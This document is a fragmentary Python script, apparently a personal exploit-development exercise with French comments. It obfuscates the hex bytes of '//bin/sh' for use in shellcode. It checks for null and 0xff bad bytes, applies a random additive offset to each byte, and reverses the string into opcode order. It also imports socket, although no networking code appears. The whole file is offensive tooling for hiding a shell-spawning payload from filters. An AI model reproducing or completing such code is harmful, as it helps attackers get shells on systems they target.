#/usr/bin/env python3

from random import randint as r
import socket
from sys import argv

#import htons

def verifOffus(binBashHexa):
    for i in range(0,18,2):
        if i == 0 :
                continue
        
        sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
        numInHex = int(sub,16)
        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
            return False
    return True


def factorOffus(string4Payload):
    if verifOffus(string4Payload) == False:
        return string4Payload

    global PAYLOAD
    arr = []
    ope = r(1,2)
    print("OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO",ope)
   
    for i in range(0,18,2):
        if i == 0 :
                continue
        
        sub ="0x"+string4Payload[i] + string4Payload[i+1]
        numInHex = int(sub,16)
        print(sub, numInHex)

        for j in range(1,15):
            
            
            if ope == 1 :
                tmp = numInHex - j
                
                if tmp < 255 and tmp > 0:
                    arr.append(j)
                else:
                    break

            if ope == 2 :
                tmp = numInHex + j
                if tmp < 255 and tmp > 0:
                    arr.append(j)
                else:
                    break

    arr[:] = list(set(arr)) #Rend unique chaque valeurs
    rand = r(arr[0],arr[-1])
    #print ("Random = ", rand, type(rand) )
    if ope == 1 :
         rand = rand * -1
    print(rand)
    return rand

def offus(string4Payload, rand):
    newString = "0x"

    for i in range(2,18,2):
        if i == 0 :
                continue
        
        sub = string4Payload[i] + string4Payload[i+1]
        numInDec = int(sub,16) + rand
        numInHex = hex(numInDec)
        newString = newString + str(numInHex[-2:])
    
    return newString


def shell():
    myString= ""
    factorOffusVar = factorOffus("0x68732f6e69622f2f")
    offuString = offus("0x68732f6e69622f2f",factorOffusVar)
    offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
    
    for i in range(0,15,2):
        sub = offuString[i+1] + offuString[i] 
        myString+= sub
    
    return myString
       
